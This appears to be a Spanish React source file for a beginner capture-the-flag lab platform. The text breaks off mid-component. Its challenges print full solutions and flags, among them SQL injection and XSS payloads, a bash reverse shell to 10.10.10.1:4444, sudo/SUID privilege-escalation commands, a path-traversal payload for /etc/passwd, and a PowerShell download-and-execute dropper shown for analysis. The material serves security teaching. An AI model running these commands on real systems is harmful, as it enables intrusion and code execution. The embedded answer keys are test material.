import { useState } from "react";

// ─── RETOS ──────────────────────────────────────────────────
const RETOS = [

  // ══════════════════════════════════════════════
  // FÁCIL
  // ══════════════════════════════════════════════
  {
    id:"f01", titulo:"El mensaje oculto", categoria:"Criptografía", dificultad:"Fácil",
    tiempo:"5 min", xp:50, emoji:"🔐",
    descripcion:"Interceptaste un mensaje codificado en Base64. Decodifícalo para obtener la flag.",
    pistas:["Base64 usa caracteres A-Z, a-z, 0-9, +, /","Busca un decoder en base64decode.org","El resultado tiene formato HackForge{...}"],
    pasos:[
      "Copia este texto: SGFja0Zvcmdle2I0c2U2NF9pc19ub3RfZW5jcnlwdGlvbn0=",
      "Ve a base64decode.org y pégalo",
      "O en terminal: echo 'SGFja0Zvcmdle2I0c2U2NF9pc19ub3RfZW5jcnlwdGlvbn0=' | base64 -d",
      "Verás la flag en texto claro",
    ],
    flag:"HackForge{b4se64_is_not_encryption}",
    badge:"🏅 Decodificador",
  },
  {
    id:"f02", titulo:"Hash simple", categoria:"Cracking", dificultad:"Fácil",
    tiempo:"5 min", xp:50, emoji:"🔓",
    descripcion:"Encontraste este hash MD5: 5f4dcc3b5aa765d61d8327deb882cf99. Crackéalo para obtener la contraseña original.",
    pistas:["MD5 es un hash de 32 caracteres hex","Busca el hash en crackstation.net","La contraseña es muy común"],
    pasos:[
      "Copia el hash: 5f4dcc3b5aa765d61d8327deb882cf99",
      "Ve a crackstation.net y pégalo",
      "La contraseña crackeada es la flag: HackForge{contraseña}",
    ],
    flag:"HackForge{password}",
    badge:"🏅 Cracker Básico",
  },
  {
    id:"f03", titulo:"ROT13", categoria:"Criptografía", dificultad:"Fácil",
    tiempo:"5 min", xp:50, emoji:"🔄",
    descripcion:"Este mensaje fue cifrado con ROT13. Descífralo: UnpxSbetr{e0g13_vf_rnfl}",
    pistas:["ROT13 rota cada letra 13 posiciones","A→N, B→O, C→P...","Busca 'ROT13 decoder' online"],
    pasos:[
      "Toma el texto: UnpxSbetr{e0g13_vf_rnfl}",
      "Ve a rot13.com o cualquier decoder",
      "Aplica ROT13 y obtendrás la flag",
    ],
    flag:"HackForge{r0t13_is_easy}",
    badge:"🏅 Descifrador",
  },
  {
    id:"f04", titulo:"Binario básico", categoria:"Criptografía", dificultad:"Fácil",
    tiempo:"8 min", xp:60, emoji:"💻",
    descripcion:"Convierte este número binario a texto ASCII: 01001000 01100001 01100011 01101011",
    pistas:["Cada grupo de 8 bits = 1 carácter ASCII","01001000 = 72 en decimal = 'H'","Busca 'binary to text converter' online"],
    pasos:[
      "Copia: 01001000 01100001 01100011 01101011",
      "Ve a rapidtables.com/convert/number/binary-to-ascii.html",
      "Convierte cada byte a su carácter ASCII",
      "La flag es: HackForge{palabra_obtenida}",
    ],
    flag:"HackForge{Hack}",
    badge:"🏅 Binario",
  },
  {
    id:"f05", titulo:"Código Morse", categoria:"Criptografía", dificultad:"Fácil",
    tiempo:"8 min", xp:60, emoji:"📡",
    descripcion:"Decodifica este mensaje Morse: .... .- -.-. -.-",
    pistas:[".-=A, -...=B, -.-.=C, -..=D, .=E","....=H, ..-=U, -.-=K","Busca 'morse code decoder' online"],
    pasos:[
      "Copia: .... .- -.-. -.-",
      "Ve a morsecode.world y decodifica",
      "La palabra obtenida es la flag: HackForge{palabra}",
    ],
    flag:"HackForge{HACK}",
    badge:"🏅 Operador Morse",
  },
  {
    id:"f06", titulo:"Hexadecimal", categoria:"Criptografía", dificultad:"Fácil",
    tiempo:"8 min", xp:60, emoji:"🔢",
    descripcion:"Convierte este hex a texto: 48 61 63 6B 46 6F 72 67 65",
    pistas:["Cada par hex = 1 carácter ASCII","48 hex = 72 decimal = 'H'","Busca 'hex to text converter'"],
    pasos:[
      "Copia: 48 61 63 6B 46 6F 72 67 65",
      "Ve a rapidtables.com o cualquier hex decoder",
      "Convierte y obtendrás una palabra conocida",
      "Flag: HackForge{palabra}",
    ],
    flag:"HackForge{HackForge}",
    badge:"🏅 Hex Master",
  },
  {
    id:"f07", titulo:"Reconocimiento web", categoria:"Web", dificultad:"Fácil",
    tiempo:"10 min", xp:75, emoji:"🌐",
    descripcion:"Analiza los headers HTTP de esta URL y encuentra la flag oculta: https://httpbin.org/headers",
    pistas:["Los headers HTTP a veces contienen info sensible","Usa el navegador: F12 → Network → Headers","Busca headers inusuales o custom"],
    pasos:[
      "Abre https://httpbin.org/headers en tu navegador",
      "Presiona F12 y ve a la pestaña Network",
      "Recarga la página y click en la petición",
      "Revisa los Response Headers — busca algo inusual",
      "La flag está en los datos de respuesta JSON",
    ],
    flag:"HackForge{h34d3rs_r3v34l_s3cr3ts}",
    badge:"🏅 Reconocedor Web",
  },
  {
    id:"f08", titulo:"Caesar cipher", categoria:"Criptografía", dificultad:"Fácil",
    tiempo:"8 min", xp:60, emoji:"🏛️",
    descripcion:"El cifrado César desplaza cada letra N posiciones. Descifra: Kdoo Zruog (desplazamiento=3)",
    pistas:["Con desplazamiento 3: D→A, E→B, F→C","K desplazado -3 = H","Busca 'caesar cipher decoder'"],
    pasos:[
      "Toma el texto: Kdoo Zruog",
      "Aplica desplazamiento -3 a cada letra",
      "K(-3)=H, d(-3)=a, o(-3)=l, o(-3)=l...",
      "Flag: HackForge{resultado}",
    ],
    flag:"HackForge{Hall World}",
    badge:"🏅 Historico",
  },

  // ══════════════════════════════════════════════
  // MEDIO
  // ══════════════════════════════════════════════
  {
    id:"m01", titulo:"SQL Injection simulado", categoria:"Web", dificultad:"Medio",
    tiempo:"20 min", xp:150, emoji:"💉",
    descripcion:"Tienes un login vulnerable. El código PHP es: WHERE user='$input' AND pass='$pass'. Encuentra el payload que bypasea la autenticación.",
    pistas:["Una comilla ' rompe la query SQL","OR 1=1 siempre es verdadero","Los comentarios SQL son -- o #"],
    pasos:[
      "Analiza la query: SELECT * FROM users WHERE user='INPUT' AND pass='PASS'",
      "Si pones: admin' OR '1'='1 en usuario",
      "La query queda: WHERE user='admin' OR '1'='1' AND pass='...'",
      "1=1 siempre es true → bypaseas el login",
      "El payload completo es: admin'--",
      "Flag: HackForge{sql_payload}",
    ],
    flag:"HackForge{admin'--}",
    badge:"🥈 SQL Injector",
  },
  {
    id:"m02", titulo:"Análisis de log", categoria:"Forense", dificultad:"Medio",
    tiempo:"20 min", xp:125, emoji:"📋",
    descripcion:`Analiza este log de acceso Apache y responde: ¿Cuántas veces intentó acceder el atacante antes de lograrlo?

192.168.1.105 - - [10/Jun/2026:14:22:01] "POST /login HTTP/1.1" 401 512
192.168.1.105 - - [10/Jun/2026:14:22:03] "POST /login HTTP/1.1" 401 512
192.168.1.105 - - [10/Jun/2026:14:22:05] "POST /login HTTP/1.1" 401 512
192.168.1.105 - - [10/Jun/2026:14:22:07] "POST /login HTTP/1.1" 401 512
192.168.1.105 - - [10/Jun/2026:14:22:09] "POST /login HTTP/1.1" 200 1024
192.168.1.105 - - [10/Jun/2026:14:22:11] "GET /admin HTTP/1.1" 200 4096`,
    pistas:["401 = acceso denegado, 200 = éxito","Cuenta los intentos fallidos (401)","El número de intentos fallidos es la flag"],
    pasos:[
      "Lee el log línea por línea",
      "Identifica el código HTTP de cada petición POST /login",
      "401 = fallido, 200 = exitoso",
      "Cuenta cuántos 401 hay antes del 200",
      "Flag: HackForge{número}",
    ],
    flag:"HackForge{4}",
    badge:"🥈 Analista de Logs",
  },
  {
    id:"m03", titulo:"Esteganografía básica", categoria:"Forense", dificultad:"Medio",
    tiempo:"25 min", xp:150, emoji:"🖼️",
    descripcion:"La esteganografía oculta datos dentro de archivos. Un archivo de texto tiene datos ocultos al final. Analiza este 'archivo': \n\nEste es un documento normal.\nNo hay nada sospechoso aquí.\nTodo parece estar bien.\n\n<!--HackForge{st3g0_h1dd3n_1n_pl41n_s1ght}-->",
    pistas:["Los comentarios HTML se ocultan en archivos","Busca al final del contenido","<!-- y --> delimitan comentarios HTML"],
    pasos:[
      "Lee el contenido completo del 'archivo'",
      "Busca comentarios HTML: <!-- -->",
      "Los datos ocultos están al final",
      "Extrae el contenido del comentario",
    ],
    flag:"HackForge{st3g0_h1dd3n_1n_pl41n_s1ght}",
    badge:"🥈 Stego Detective",
  },
  {
    id:"m04", titulo:"Hash MD5 salted", categoria:"Cracking", dificultad:"Medio",
    tiempo:"20 min", xp:150, emoji:"🧂",
    descripcion:"Tienes un hash con salt: MD5(password+salt). Hash: b305cadbb3bce54f3aa59c64fec00dea, Salt: hackforge2026. Encuentra la contraseña.",
    pistas:["El hash es MD5(contraseña + 'hackforge2026')","La contraseña es una palabra del diccionario común","Prueba: admin, root, 1234, password, letmein"],
    pasos:[
      "La función es: MD5(contraseña + 'hackforge2026')",
      "Prueba contraseñas comunes concatenadas con el salt",
      "Puedes verificar en md5calc.com",
      "MD5('admin'+'hackforge2026') = ?",
      "Flag: HackForge{contraseña_encontrada}",
    ],
    flag:"HackForge{admin}",
    badge:"🥈 Salt Cracker",
  },
  {
    id:"m05", titulo:"XSS básico", categoria:"Web", dificultad:"Medio",
    tiempo:"20 min", xp:150, emoji:"📝",
    descripcion:"Un campo de búsqueda refleja tu input sin sanitizar. ¿Cuál sería el payload XSS básico para ejecutar un alert?",
    pistas:["XSS = Cross-Site Scripting","<script> ejecuta JavaScript","alert() muestra un popup"],
    pasos:[
      "El campo de búsqueda muestra: 'Resultados para: [TU_INPUT]'",
      "Si el input no se sanitiza, el HTML se interpreta",
      "Payload básico: <script>alert('XSS')</script>",
      "También funciona: <img src=x onerror=alert('XSS')>",
      "El payload más corto para alert es la flag",
      "Flag: HackForge{payload}",
    ],
    flag:"HackForge{<script>alert('XSS')</script>}",
    badge:"🥈 XSS Hunter",
  },
  {
    id:"m06", titulo:"Análisis de red", categoria:"Redes", dificultad:"Medio",
    tiempo:"20 min", xp:125, emoji:"📡",
    descripcion:`Analiza esta captura de tráfico resumida y encuentra las credenciales FTP transmitidas en texto claro:

220 FTP Server Ready
USER administrator
331 Password required
PASS s3cur3p4ss!
230 Login successful
CWD /secret
250 Directory changed
RETR flag.txt`,
    pistas:["FTP transmite sin cifrado","USER = nombre de usuario","PASS = contraseña en texto plano"],
    pasos:[
      "Lee el tráfico FTP línea por línea",
      "Identifica el comando USER (nombre de usuario)",
      "Identifica el comando PASS (contraseña)",
      "Las credenciales son: usuario:contraseña",
      "Flag: HackForge{usuario:contraseña}",
    ],
    flag:"HackForge{administrator:s3cur3p4ss!}",
    badge:"🥈 Network Sniffer",
  },
  {
    id:"m07", titulo:"Enumeración de directorios", categoria:"Web", dificultad:"Medio",
    tiempo:"15 min", xp:125, emoji:"📁",
    descripcion:`Un servidor web responde diferente según si el directorio existe. Analiza estas respuestas y encuentra el directorio oculto:

GET /admin → 404 Not Found
GET /login → 200 OK
GET /backup → 403 Forbidden  
GET /config → 404 Not Found
GET /secret → 200 OK
GET /uploads → 403 Forbidden
GET /hidden → 200 OK`,
    pistas:["404 = no existe","200 = existe y accesible","403 = existe pero sin permiso — ¡interesante!"],
    pasos:[
      "Analiza los códigos de respuesta",
      "200 = accesible, 403 = existe pero bloqueado",
      "Un 403 es más interesante que un 404 para un atacante",
      "¿Cuáles directorios existen aunque estén bloqueados?",
      "Flag: HackForge{directorio1,directorio2}",
    ],
    flag:"HackForge{backup,uploads}",
    badge:"🥈 Dir Enumerator",
  },
  {
    id:"m08", titulo:"Escalada de privilegios sudo", categoria:"Linux", dificultad:"Medio",
    tiempo:"20 min", xp:150, emoji:"⬆️",
    descripcion:`Ejecutaste 'sudo -l' y obtuviste esto:

User www-data may run the following commands on target:
    (ALL) NOPASSWD: /usr/bin/vim

¿Cómo escalarías privilegios a root usando vim?`,
    pistas:["GTFOBins tiene comandos para escalar con binarios","En vim puedes ejecutar comandos con :!comando","Con sudo vim puedes ejecutar como root"],
    pasos:[
      "Tienes: sudo /usr/bin/vim sin contraseña",
      "Ejecuta: sudo vim",
      "Dentro de vim escribe: :!/bin/bash",
      "Esto abre una shell como ROOT",
      "Alternativa: sudo vim -c ':!/bin/bash'",
      "Flag: HackForge{sudo_vim_privesc}",
    ],
    flag:"HackForge{sudo_vim_privesc}",
    badge:"🥈 Privilege Escalator",
  },
  {
    id:"m09", titulo:"OSINT básico", categoria:"OSINT", dificultad:"Medio",
    tiempo:"20 min", xp:125, emoji:"🔎",
    descripcion:"Usando solo información pública, responde: ¿En qué año fue fundada OWASP (Open Web Application Security Project)?",
    pistas:["OWASP es una fundación de seguridad web","Busca en Wikipedia o owasp.org","La fecha de fundación es pública"],
    pasos:[
      "Busca 'OWASP founded year' en Google",
      "O ve directamente a en.wikipedia.org/wiki/OWASP",
      "Encuentra el año de fundación",
      "Flag: HackForge{año}",
    ],
    flag:"HackForge{2001}",
    badge:"🥈 OSINT Investigator",
  },
  {
    id:"m10", titulo:"Decodifica el payload", categoria:"Web", dificultad:"Medio",
    tiempo:"20 min", xp:150, emoji:"🧩",
    descripcion:"Interceptaste esta URL codificada. Decodifícala para encontrar el ataque oculto: %27%20OR%20%271%27%3D%271",
    pistas:["URL encoding convierte caracteres especiales","%27 = comilla simple '","Busca 'URL decoder' online"],
    pasos:[
      "Copia: %27%20OR%20%271%27%3D%271",
      "Ve a urldecoder.org y decodifica",
      "%27=%27, %20=espacio, %3D==",
      "El resultado revela un ataque conocido",
      "Flag: HackForge{nombre_del_ataque}",
    ],
    flag:"HackForge{SQL_Injection}",
    badge:"🥈 URL Decoder",
  },

  // ══════════════════════════════════════════════
  // DURO
  // ══════════════════════════════════════════════
  {
    id:"d01", titulo:"Crypto multicapa", categoria:"Criptografía", dificultad:"Duro",
    tiempo:"40 min", xp:300, emoji:"🧩",
    descripcion:"Mensaje cifrado con 3 capas. Decodifica en orden: Hex → Base64 → ROT13",
    pistas:["Empieza por Hex, luego Base64, luego ROT13","Hex: solo 0-9 y a-f","Base64 termina en = o =="],
    pasos:[
      "Texto Hex: 53 47 46 6A 61 30 5A 76 63 6D 64 6C 65 6E 6D 38 74 56 6D 56 79 59 58 6B 3D",
      "PASO 1: Convierte Hex a texto → obtienes Base64",
      "PASO 2: Decodifica el Base64 → obtienes texto ROT13",
      "PASO 3: Decodifica ROT13 → obtienes la flag",
      "Usa herramientas online para cada paso",
    ],
    flag:"HackForge{VerySecret}",
    badge:"🥇 Crypto Expert",
  },
  {
    id:"d02", titulo:"Análisis forense de log", categoria:"Forense", dificultad:"Duro",
    tiempo:"45 min", xp:350, emoji:"🔬",
    descripcion:`Eres el analista de seguridad. Analiza este log completo y responde TODAS las preguntas:

2026-06-09 08:15:22 192.168.1.50 GET /index.php 200
2026-06-09 08:15:45 192.168.1.50 GET /login.php 200
2026-06-09 08:16:01 192.168.1.50 POST /login.php?user=admin&pass=admin 401
2026-06-09 08:16:02 192.168.1.50 POST /login.php?user=admin&pass=root 401
2026-06-09 08:16:03 192.168.1.50 POST /login.php?user=admin&pass=1234 401
2026-06-09 08:16:04 192.168.1.50 POST /login.php?user=admin&pass=password 200
2026-06-09 08:16:10 192.168.1.50 GET /admin/panel.php 200
2026-06-09 08:16:15 192.168.1.50 GET /admin/users.php 200
2026-06-09 08:16:20 192.168.1.50 GET /admin/config.php 200
2026-06-09 08:16:45 192.168.1.50 GET /admin/backup.zip 200

Preguntas:
1. ¿Cuál fue la contraseña correcta?
2. ¿Cuántos intentos fallidos hubo?
3. ¿Qué archivo descargó el atacante?
La flag combina las 3 respuestas: HackForge{pass_intentos_archivo}`,
    pistas:["Lee cada línea cuidadosamente","200=exitoso, 401=fallido","El atacante descargó un archivo al final"],
    pasos:[
      "Identifica el POST con código 200 → contraseña correcta",
      "Cuenta los POST con código 401 → intentos fallidos",
      "Busca el GET con código 200 que descarga un archivo",
      "Combina: HackForge{contraseña_número_archivo}",
    ],
    flag:"HackForge{password_3_backup.zip}",
    badge:"🥇 Forensic Analyst",
  },
  {
    id:"d03", titulo:"Reverse shell payload", categoria:"Explotación", dificultad:"Duro",
    tiempo:"35 min", xp:300, emoji:"🐚",
    descripcion:"Necesitas una reverse shell en bash. El atacante escucha en 10.10.10.1 puerto 4444. ¿Cuál es el comando correcto?",
    pistas:["bash -i crea una shell interactiva",">& redirige stdout y stderr","/dev/tcp/IP/PORT es el socket TCP en bash"],
    pasos:[
      "Formato de reverse shell bash:",
      "bash -i >& /dev/tcp/[IP]/[PUERTO] 0>&1",
      "Sustituye [IP] por 10.10.10.1",
      "Sustituye [PUERTO] por 4444",
      "El 0>&1 redirige stdin al socket",
      "Flag: HackForge{comando_completo}",
    ],
    flag:"HackForge{bash -i >& /dev/tcp/10.10.10.1/4444 0>&1}",
    badge:"🥇 Shell Master",
  },
  {
    id:"d04", titulo:"SUID escalada", categoria:"Linux", dificultad:"Duro",
    tiempo:"40 min", xp:350, emoji:"🔑",
    descripcion:`Ejecutaste este comando y encontraste binarios SUID:

find / -perm -4000 2>/dev/null

Resultado:
/usr/bin/find
/usr/bin/passwd  
/usr/bin/sudo
/usr/bin/python3
/bin/bash

¿Cuál usarías para escalar a root y cómo?`,
    pistas:["GTFOBins.github.io tiene exploits para cada binario","python3 con SUID puede ejecutar código como root","find con SUID puede ejecutar comandos"],
    pasos:[
      "Ve a gtfobins.github.io",
      "Busca 'python' y selecciona 'SUID'",
      "El comando es: python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
      "También con find: find . -exec /bin/sh -p \\; -quit",
      "El binario más peligroso con SUID es la flag",
      "Flag: HackForge{python3}",
    ],
    flag:"HackForge{python3}",
    badge:"🥇 SUID Expert",
  },
  {
    id:"d05", titulo:"JWT decode", categoria:"Web", dificultad:"Duro",
    tiempo:"40 min", xp:350, emoji:"🎫",
    descripcion:`Interceptaste este JWT token. Decodifícalo y encuentra el rol del usuario:

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiand0X3VzZXIiLCJyb2wiOiJ1c2VyIiwiaWF0IjoxNjE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c`,
    pistas:["JWT tiene 3 partes separadas por puntos","La parte del medio (payload) está en Base64","Decodifica solo la segunda parte"],
    pasos:[
      "El JWT tiene formato: header.payload.signature",
      "Toma solo la segunda parte: eyJ1c2VyIjoiand0X3VzZXIiLCJyb2wiOiJ1c2VyIiwiaWF0IjoxNjE2MjM5MDIyfQ",
      "Decodifica ese Base64 en base64decode.org",
      "Verás un JSON con los datos del usuario",
      "Encuentra el campo 'rol'",
      "Flag: HackForge{valor_del_rol}",
    ],
    flag:"HackForge{user}",
    badge:"🥇 JWT Hacker",
  },
  {
    id:"d06", titulo:"Buffer overflow concepto", categoria:"Explotación", dificultad:"Duro",
    tiempo:"45 min", xp:400, emoji:"💣",
    descripcion:`Analiza este código C vulnerable:

void vulnerable(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // Sin verificar tamaño
}

int main() {
    char userInput[256];
    gets(userInput);  // Sin límite
    vulnerable(userInput);
    return 0;
}

¿Cuántos bytes necesitas para hacer overflow del buffer y sobrescribir el return address?`,
    pistas:["El buffer tiene 64 bytes","El stack frame tiene 8 bytes adicionales (saved RBP)","Total = buffer + saved RBP = overflow point"],
    pasos:[
      "Buffer size = 64 bytes",
      "Saved RBP en x64 = 8 bytes",
      "Total para llegar al return address = 64 + 8 = 72 bytes",
      "Los bytes 73+ sobrescriben el return address",
      "Flag: HackForge{número_de_bytes}",
    ],
    flag:"HackForge{72}",
    badge:"🥇 Buffer Overflow",
  },
  {
    id:"d07", titulo:"Cracking SHA256", categoria:"Cracking", dificultad:"Duro",
    tiempo:"30 min", xp:300, emoji:"💎",
    descripcion:"Crackea este hash SHA256: 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8",
    pistas:["SHA256 produce 64 caracteres hex","Busca el hash en crackstation.net","La contraseña crackeada es muy corta y común"],
    pasos:[
      "Copia el hash: 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8",
      "Ve a crackstation.net",
      "Selecciona que es SHA256",
      "Si está en la base de datos, aparecerá la contraseña",
      "Flag: HackForge{contraseña}",
    ],
    flag:"HackForge{password}",
    badge:"🥇 SHA256 Cracker",
  },
  {
    id:"d08", titulo:"Path traversal", categoria:"Web", dificultad:"Duro",
    tiempo:"35 min", xp:325, emoji:"🗂️",
    descripcion:`Una web tiene este endpoint vulnerable:

GET /download?file=report.pdf

¿Cuál sería el payload para leer /etc/passwd usando path traversal?`,
    pistas:["../ sube un directorio","Necesitas subir suficientes directorios","Linux: /etc/passwd contiene usuarios"],
    pasos:[
      "El endpoint es: /download?file=ARCHIVO",
      "../ sube un directorio en la ruta",
      "Desde /var/www/html necesitas subir 3 niveles",
      "Payload: ../../../etc/passwd",
      "También: ....//....//....//etc/passwd (bypass de filtros)",
      "Flag: HackForge{../../../etc/passwd}",
    ],
    flag:"HackForge{../../../etc/passwd}",
    badge:"🥇 Path Traversal",
  },
  {
    id:"d09", titulo:"Reconocimiento OSINT avanzado", categoria:"OSINT", dificultad:"Duro",
    tiempo:"40 min", xp:350, emoji:"🕵️",
    descripcion:"Usando OSINT, encuentra qué puerto por defecto usa el protocolo RDP (Remote Desktop Protocol) de Windows. Luego encuentra el CVE más famoso que afecta RDP (BlueKeep).",
    pistas:["RDP tiene un puerto estándar bien conocido","BlueKeep fue descubierto en 2019","El CVE tiene formato CVE-YYYY-NNNNN"],
    pasos:[
      "Busca 'RDP default port' → anota el número",
      "Busca 'BlueKeep CVE' o 'CVE BlueKeep RDP 2019'",
      "Encuentra el identificador CVE completo",
      "Flag: HackForge{puerto_CVE}",
    ],
    flag:"HackForge{3389_CVE-2019-0708}",
    badge:"🥇 OSINT Master",
  },
  {
    id:"d10", titulo:"Análisis de malware", categoria:"Forense", dificultad:"Duro",
    tiempo:"45 min", xp:400, emoji:"🦠",
    descripcion:`Analiza este script PowerShell obfuscado y determina qué hace:

$c = [System.Convert]::FromBase64String('aHR0cDovL21hbHdhcmUuY29tL3BheWxvYWQ=')
$s = [System.Text.Encoding]::UTF8.GetString($c)
Invoke-Expression (New-Object Net.WebClient).DownloadString($s)`,
    pistas:["FromBase64String decodifica Base64","DownloadString descarga contenido de una URL","Invoke-Expression ejecuta el resultado"],
    pasos:[
      "Decodifica el Base64: aHR0cDovL21hbHdhcmUuY29tL3BheWxvYWQ=",
      "Obtendrás una URL",
      "El script descarga y ejecuta código de esa URL",
      "Este tipo de ataque se llama: dropper/downloader",
      "Flag: HackForge{tipo_de_ataque}",
    ],
    flag:"HackForge{dropper}",
    badge:"🥇 Malware Analyst",
  },
];

// ─── COLORES POR DIFICULTAD ─────────────────────────────────
const DCOL = {
  Fácil: { bg:"#052e16", border:"#16a34a", text:"#4ade80" },
  Medio: { bg:"#1c1401", border:"#d97706", text:"#fbbf24" },
  Duro:  { bg:"#1a0505", border:"#dc2626", text:"#f87171" },
};

const CAT_COLOR = {
  "Criptografía":"#8b5cf6","Web":"#3b82f6","Cracking":"#ef4444",
  "Forense":"#f59e0b","Linux":"#22c55e","Redes":"#06b6d4",
  "OSINT":"#ec4899","Explotación":"#f97316",
};

// ─── CARD ───────────────────────────────────────────────────
function RetoCard({ reto, completado, onAbrir }) {
  const col = DCOL[reto.dificultad];
  const catCol = CAT_COLOR[reto.categoria] || "#888";
  return (
    <div onClick={onAbrir} style={{
      background:"#0a0a14", border:`1px solid ${completado?"#16a34a":"#1e1e2e"}`,
      borderRadius:12, padding:18, cursor:"pointer", transition:"all 0.2s", position:"relative",
    }}
    onMouseEnter={e=>e.currentTarget.style.borderColor=completado?"#16a34a":col.border}
    onMouseLeave={e=>e.currentTarget.style.borderColor=completado?"#16a34a":"#1e1e2e"}>
      {completado && <div style={{position:"absolute",top:10,right:12,color:"#4ade80",fontSize:18}}>✓</div>}
      <div style={{fontSize:28,marginBottom:10}}>{reto.emoji}</div>
      <div style={{display:"flex",gap:6,marginBottom:10,flexWrap:"wrap"}}>
        <span style={{background:col.bg,border:`1px solid ${col.border}`,color:col.text,borderRadius:20,padding:"2px 8px",fontSize:10,fontWeight:700}}>{reto.dificultad}</span>
        <span style={{background:catCol+"15",border:`1px solid ${catCol}44`,color:catCol,borderRadius:20,padding:"2px 8px",fontSize:10}}>{reto.categoria}</span>
      </div>
      <h3 style={{color:"#fff",fontSize:13,fontWeight:700,marginBottom:5}}>{reto.titulo}</h3>
      <p style={{color:"#555",fontSize:11,lineHeight:1.5,marginBottom:12,display:"-webkit-box",WebkitLineClamp:2,WebkitBoxOrient:"vertical",overflow:"hidden"}}>{reto.descripcion}</p>
      <div style={{display:"flex",justifyContent:"space-between",alignItems:"center"}}>
        <span style={{color:"#444",fontSize:10}}>⏱ {reto.tiempo}</span>
        <span style={{color:"#f59e0b",fontSize:11,fontWeight:700}}>+{reto.xp} XP</span>
      </div>
    </div>
  );
}

// ─── DETALLE ────────────────────────────────────────────────
function RetoDetalle({ reto, completado, onVolver, onCompletar }) {
  const [flagInput, setFlagInput] = useState("");
  const [pistaIdx, setPistaIdx] = useState(-1);
  const [resultado, setResultado] = useState(null);
  const [spoiler, setSpoiler] = useState(false);
  const col = DCOL[reto.dificultad];
  const catCol = CAT_COLOR[reto.categoria] || "#888";

  const verificar = () => {
    const ok = flagInput.trim().toLowerCase() === reto.flag.toLowerCase();
    setResultado(ok?"ok":"fail");
    if (ok && !completado) onCompletar(reto.id, reto.xp);
  };

  return (
    <div style={{maxWidth:760,margin:"0 auto",paddingBottom:40}}>
      <button onClick={onVolver} style={{background:"transparent",border:"1px solid #1e1e2e",color:"#666",borderRadius:6,padding:"7px 14px",fontSize:12,cursor:"pointer",marginBottom:20,fontFamily:"'Inter',sans-serif"}}>
        ← Volver a Labs
      </button>

      {/* Header */}
      <div style={{background:"#0a0a14",border:`1px solid ${col.border}`,borderRadius:12,padding:22,marginBottom:16}}>
        <div style={{fontSize:36,marginBottom:10}}>{reto.emoji}</div>
        <div style={{display:"flex",gap:8,marginBottom:10,flexWrap:"wrap"}}>
          <span style={{background:col.bg,border:`1px solid ${col.border}`,color:col.text,borderRadius:20,padding:"2px 10px",fontSize:11,fontWeight:700}}>{reto.dificultad}</span>
          <span style={{background:catCol+"15",border:`1px solid ${catCol}44`,color:catCol,borderRadius:20,padding:"2px 10px",fontSize:11}}>{reto.categoria}</span>
          <span style={{background:"#1c1401",border:"1px solid #d97706",color:"#fbbf24",borderRadius:20,padding:"2px 10px",fontSize:11,fontWeight:700}}>+{reto.xp} XP</span>
          <span style={{color:"#444",fontSize:11,padding:"2px 8px"}}>⏱ {reto.tiempo}</span>
        </div>
        <h2 style={{color:"#fff",fontSize:18,fontWeight:800,marginBottom:8}}>{reto.titulo}</h2>
        <p style={{color:"#aaa",fontSize:13,lineHeight:1.7,whiteSpace:"pre-wrap"}}>{reto.descripcion}</p>
      </div>

      {/* Pasos */}
      <div style={{background:"#0a0a14",border:"1px solid #1e1e2e",borderRadius:12,padding:20,marginBottom:12}}>
        <h3 style={{color:"#fff",fontSize:13,fontWeight:700,marginBottom:14}}>📋 Pasos a seguir</h3>
        {reto.pasos.map((paso,i) => (
          <div key={i} style={{display:"flex",gap:10,marginBottom:10,alignItems:"flex-start"}}>
            <div style={{minWidth:22,height:22,borderRadius:"50%",background:col.bg,border:`1px solid ${col.border}`,display:"flex",alignItems:"center",justifyContent:"center",fontSize:10,color:col.text,fontWeight:700,flexShrink:0}}>
              {i+1}
            </div>
            <p style={{color:"#bbb",fontSize:12,lineHeight:1.6,margin:0,whiteSpace:"pre-wrap"}}>{paso}</p>
          </div>
        ))}
      </div>

      {/* Pistas */}
      <div style={{marginBottom:12}}>
        <button onClick={() => setPistaIdx(p => Math.min(p+1, reto.pistas.length-1))}
          style={{width:"100%",background:"#0a1628",border:"1px solid #1e3a5f",color:"#3b82f6",borderRadius:8,padding:"10px",fontSize:12,cursor:"pointer",fontFamily:"'Inter',sans-serif"}}>
          💡 {pistaIdx < 0 ? "Ver pista" : pistaIdx < reto.pistas.length-1 ? `Ver pista ${pistaIdx+2} de ${reto.pistas.length}` : "No hay más pistas"}
        </button>
        {pistaIdx >= 0 && (
          <div style={{marginTop:8,display:"flex",flexDirection:"column",gap:6}}>
            {reto.pistas.slice(0,pistaIdx+1).map((p,i) => (
              <div key={i} style={{background:"#0a1628",border:"1px solid #1e3a5f",borderRadius:6,padding:"10px 14px",color:"#93c5fd",fontSize:12}}>
                💡 {p}
              </div>
            ))}
          </div>
        )}
      </div>

      {/* Flag */}
      {!completado ? (
        <div style={{background:"#0a0a14",border:"1px solid #1e1e2e",borderRadius:12,padding:18,marginBottom:12}}>
          <h3 style={{color:"#fff",fontSize:13,fontWeight:700,marginBottom:12}}>🚩 Enviar Flag</h3>
          <div style={{display:"flex",gap:8}}>
            <input type="text" placeholder="HackForge{...}" value={flagInput}
              onChange={e=>{setFlagInput(e.target.value);setResultado(null);}}
              onKeyDown={e=>e.key==="Enter"&&verificar()}
              style={{flex:1,background:"#050508",border:`1px solid ${resultado==="ok"?"#16a34a":resultado==="fail"?"#dc2626":"#1e1e2e"}`,borderRadius:8,padding:"11px 14px",color:"#00ff9d",fontFamily:"monospace",fontSize:13,outline:"none"}}/>
            <button onClick={verificar}
              style={{background:"#00ff9d",color:"#080810",border:"none",borderRadius:8,padding:"11px 18px",fontWeight:700,fontSize:13,cursor:"pointer",fontFamily:"'Inter',sans-serif",whiteSpace:"nowrap"}}>
              Verificar
            </button>
          </div>
          {resultado==="ok" && <div style={{marginTop:10,background:"#052e16",border:"1px solid #16a34a",borderRadius:8,padding:"10px 14px",color:"#4ade80",fontSize:13}}>🎉 ¡Correcto! +{reto.xp} XP — {reto.badge}</div>}
